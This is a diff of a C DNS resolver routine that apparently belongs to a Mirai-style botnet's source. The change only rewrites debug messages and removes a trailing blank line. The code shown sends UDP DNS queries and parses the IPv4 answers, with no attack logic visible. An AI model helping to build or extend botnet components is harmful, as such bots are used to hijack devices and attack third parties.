@@ -102,7 +102,7 @@ struct resolv_entries *resolv_lookup(char *domain)
         if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
         {
 #ifdef DEBUG
-            printf("[resolv] Failed to create socket\n");
+            printf("(unstable/resolver) failed to create socket\n");
 #endif
             sleep(1);
             continue;
@@ -111,7 +111,7 @@ struct resolv_entries *resolv_lookup(char *domain)
         if (connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
         {
 #ifdef DEBUG
-            printf("[resolv] Failed to call connect on udp socket\n");
+            printf("(unstable/resolver) failed to call connect on udp socket\n");
 #endif
             sleep(1);
             continue;
@@ -120,7 +120,7 @@ struct resolv_entries *resolv_lookup(char *domain)
         if (send(fd, query, query_len, MSG_NOSIGNAL) == -1)
         {
 #ifdef DEBUG
-            printf("[resolv] Failed to send packet: %d\n", errno);
+            printf("(unstable/resolver) failed to send packet: %d\n", errno);
 #endif
             sleep(1);
             continue;
@@ -137,21 +137,21 @@ struct resolv_entries *resolv_lookup(char *domain)
         if (nfds == -1)
         {
 #ifdef DEBUG
-            printf("[resolv] select() failed\n");
+            printf("(unstable/resolver) select() failed\n");
 #endif
             break;
         }
         else if (nfds == 0)
         {
 #ifdef DEBUG
-            printf("[resolv] Couldn't resolve %s in time. %d tr%s\n", domain, tries, tries == 1 ? "y" : "ies");
+            printf("(unstable/resolver) couldn't resolve %s in time. %d tr%s\n", domain, tries, tries == 1 ? "y" : "ies");
 #endif
             continue;
         }
         else if (FD_ISSET(fd, &fdset))
         {
 #ifdef DEBUG
-            printf("[resolv] Got response from select\n");
+            printf("(unstable/resolver) got response from select\n");
 #endif
             int ret = recvfrom(fd, response, sizeof (response), MSG_NOSIGNAL, NULL, NULL);
             char *name;
@@ -197,7 +197,7 @@ struct resolv_entries *resolv_lookup(char *domain)
                         entries->addrs = realloc(entries->addrs, (entries->addrs_len + 1) * sizeof (ipv4_t));
                         entries->addrs[entries->addrs_len++] = (*p);
 #ifdef DEBUG
-                        printf("[resolv] Found IP address: %08x\n", (*p));
+                        printf("(unstable/resolver) found ipv4 address: %08x\n", (*p));
 #endif
                     }
 
@@ -215,7 +215,7 @@ struct resolv_entries *resolv_lookup(char *domain)
     close(fd);
 
 #ifdef DEBUG
-    printf("Resolved %s to %d IPv4 addresses\n", domain, entries->addrs_len);
+    printf("(unstable/resolver) resolved %s to %d ipv4 addresses\n", domain, entries->addrs_len);
 #endif
 
     if (entries->addrs_len > 0)
@@ -235,4 +235,3 @@ void resolv_entries_free(struct resolv_entries *entries)
         free(entries->addrs);
     free(entries);
 }
-
